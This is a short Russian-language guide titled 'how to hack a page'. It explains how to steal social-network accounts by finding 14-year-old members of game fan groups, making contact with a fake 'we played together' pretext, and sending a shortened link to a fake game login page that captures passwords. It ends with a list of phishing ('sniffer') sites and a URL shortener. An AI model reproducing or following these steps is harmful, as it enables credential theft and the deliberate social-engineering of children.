Как взломать страницу
 1.Итак начнём с того что вам нужно зайти на сниффер
 2.Найти ссылку какой нибудь игры копатель,Кс го.и сократить её.
 3.Потом найти офишал группу игры, нажать участники и ставите 14 лет, после чего ищите человека с аватаркой той игры либо какой нибудь детской.
 4.И там нужно уже подключать фантазию ну например я всегда пишу так "Привет броу помнишь мы вместе играли?"-Во что? "Вспоминай" и потом когда он говорит игру соглашайтесь!
 5.Вообщем в чём смысл вы кидаете ему сниффер он логинется и пароль с логином у вас

Сайты
Ссылка на 1 сайт: https://fake-game.ru
Аналоги (если сайт сломан) snifman.pw kotfake.ru
Ссылка на сократитель ссылок https://goo.gl
Ссылка на бесплатный сниффер: https://osniffer.ru
Снифман — http://snif-f.ru/
Снифман-http://snifman.pw/w